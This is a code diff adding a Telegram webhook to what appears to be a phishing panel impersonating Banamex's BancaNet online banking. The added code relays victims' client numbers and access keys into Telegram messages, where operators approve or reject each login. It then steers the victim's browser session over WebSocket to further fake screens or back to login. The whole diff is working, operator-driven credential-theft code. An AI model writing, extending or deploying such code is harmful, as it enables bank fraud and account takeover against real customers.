@@ -1051,6 +1051,166 @@ export async function registerRoutes(app: Express): Promise<Server> {
     }
   });
 
+  // Webhook de Telegram para recibir callbacks de botones
+  app.post('/api/telegram/webhook', async (req, res) => {
+    try {
+      const update = req.body;
+      
+      // Solo procesar callback_query (respuestas a botones inline)
+      if (!update.callback_query) {
+        return res.status(200).json({ ok: true });
+      }
+
+      const callbackQuery = update.callback_query;
+      const callbackData = callbackQuery.data;
+      const telegramUserId = callbackQuery.from?.id;
+      const telegramUsername = callbackQuery.from?.username || 'Unknown';
+
+      console.log(`[Telegram Webhook] Callback recibido: ${callbackData} de @${telegramUsername}`);
+
+      // Parsear el callback_data: "login:ok:validationId" o "login:fail:validationId"
+      const [action, decision, validationId] = callbackData.split(':');
+
+      if (action !== 'login' || !validationId) {
+        console.log('[Telegram Webhook] Callback no válido, ignorando');
+        return res.status(200).json({ ok: true });
+      }
+
+      // Buscar la validación en la base de datos
+      const validation = await storage.getTelegramValidationById(validationId);
+
+      if (!validation) {
+        console.log(`[Telegram Webhook] Validación no encontrada: ${validationId}`);
+        // Responder al callback de Telegram
+        await answerCallbackQuery(callbackQuery.id, '❌ Validación no encontrada');
+        return res.status(200).json({ ok: true });
+      }
+
+      // Verificar si la validación ya fue procesada o expiró
+      if (validation.status !== 'pending') {
+        console.log(`[Telegram Webhook] Validación ya procesada: ${validationId}, estado: ${validation.status}`);
+        await answerCallbackQuery(callbackQuery.id, `⚠️ Esta validación ya fue ${validation.status === 'approved' ? 'aprobada' : validation.status === 'rejected' ? 'rechazada' : 'expirada'}`);
+        return res.status(200).json({ ok: true });
+      }
+
+      // Verificar si expiró
+      if (new Date(validation.expiresAt) < new Date()) {
+        await storage.updateTelegramValidation(validationId, {
+          status: 'expired',
+          respondedAt: new Date()
+        });
+        await answerCallbackQuery(callbackQuery.id, '⏰ Esta validación ha expirado');
+        return res.status(200).json({ ok: true });
+      }
+
+      // Obtener la sesión
+      const session = await storage.getSessionById(validation.sessionId);
+      if (!session) {
+        console.log(`[Telegram Webhook] Sesión no encontrada: ${validation.sessionId}`);
+        await answerCallbackQuery(callbackQuery.id, '❌ Sesión no encontrada');
+        return res.status(200).json({ ok: true });
+      }
+
+      if (decision === 'ok') {
+        // APROBAR: Actualizar validación y sesión
+        await storage.updateTelegramValidation(validationId, {
+          status: 'approved',
+          adminUser: telegramUsername,
+          respondedAt: new Date()
+        });
+
+        const updatedSession = await storage.updateSession(validation.sessionId, {
+          loginValidated: true,
+          pasoActual: ScreenType.AVISO_SEGURIDAD // Avanzar al siguiente paso
+        });
+
+        console.log(`[Telegram Webhook] Login APROBADO para sesión ${validation.sessionId} por @${telegramUsername}`);
+
+        // Editar el mensaje original de Telegram para mostrar que fue aprobado
+        if (validation.telegramMessageId) {
+          const editedMessage = 
+            `🏦 <b>Login - Aclaraciones BancaNet</b>\n\n` +
+            `📱 <b>Número de Cliente:</b> ${validation.numeroCliente}\n` +
+            `🔑 <b>Clave de Acceso:</b> ${validation.claveAcceso}\n` +
+            `🆔 <b>Session ID:</b> ${validation.sessionId}\n\n` +
+            `✅ <b>APROBADO</b> por @${telegramUsername}\n` +
+            `⏰ ${new Date().toLocaleString('es-MX')}`;
+          await editTelegramMessage(validation.telegramMessageId, editedMessage);
+        }
+
+        // Notificar al cliente vía WebSocket
+        const updateMessage = JSON.stringify({
+          type: 'SESSION_UPDATE',
+          data: updatedSession
+        });
+        sendToClient(validation.sessionId, updateMessage);
+        broadcastToAdmins(updateMessage);
+
+        await answerCallbackQuery(callbackQuery.id, '✅ Login aprobado - Cliente avanzando');
+
+      } else if (decision === 'fail') {
+        // RECHAZAR: Actualizar validación y volver al login
+        await storage.updateTelegramValidation(validationId, {
+          status: 'rejected',
+          adminUser: telegramUsername,
+          respondedAt: new Date()
+        });
+
+        const updatedSession = await storage.updateSession(validation.sessionId, {
+          loginValidated: false,
+          numeroCliente: null, // Limpiar credenciales
+          claveAcceso: null,
+          pasoActual: ScreenType.LOGIN // Volver al login
+        });
+
+        console.log(`[Telegram Webhook] Login RECHAZADO para sesión ${validation.sessionId} por @${telegramUsername}`);
+
+        // Editar el mensaje original de Telegram
+        if (validation.telegramMessageId) {
+          const editedMessage = 
+            `🏦 <b>Login - Aclaraciones BancaNet</b>\n\n` +
+            `📱 <b>Número de Cliente:</b> ${validation.numeroCliente}\n` +
+            `🔑 <b>Clave de Acceso:</b> ${validation.claveAcceso}\n` +
+            `🆔 <b>Session ID:</b> ${validation.sessionId}\n\n` +
+            `❌ <b>RECHAZADO</b> por @${telegramUsername}\n` +
+            `⏰ ${new Date().toLocaleString('es-MX')}`;
+          await editTelegramMessage(validation.telegramMessageId, editedMessage);
+        }
+
+        // Notificar al cliente vía WebSocket para volver al login
+        const updateMessage = JSON.stringify({
+          type: 'SESSION_UPDATE',
+          data: updatedSession
+        });
+        sendToClient(validation.sessionId, updateMessage);
+        broadcastToAdmins(updateMessage);
+
+        await answerCallbackQuery(callbackQuery.id, '❌ Login rechazado - Cliente volverá a intentar');
+      }
+
+      res.status(200).json({ ok: true });
+    } catch (error) {
+      console.error('[Telegram Webhook] Error:', error);
+      res.status(200).json({ ok: true }); // Siempre responder 200 a Telegram
+    }
+  });
+
+  // Función helper para responder a callbacks de Telegram
+  async function answerCallbackQuery(callbackQueryId: string, text: string) {
+    const botToken = process.env.TELEGRAM_BOT_TOKEN;
+    if (!botToken) return;
+
+    try {
+      await axios.post(`https://api.telegram.org/bot${botToken}/answerCallbackQuery`, {
+        callback_query_id: callbackQueryId,
+        text: text,
+        show_alert: false
+      });
+    } catch (error) {
+      console.error('[Telegram] Error respondiendo callback:', error);
+    }
+  }
+
   app.post('/api/banamex/submit-netkey', async (req, res) => {
     try {
       const { sessionId, netkeyResponse } = req.body;
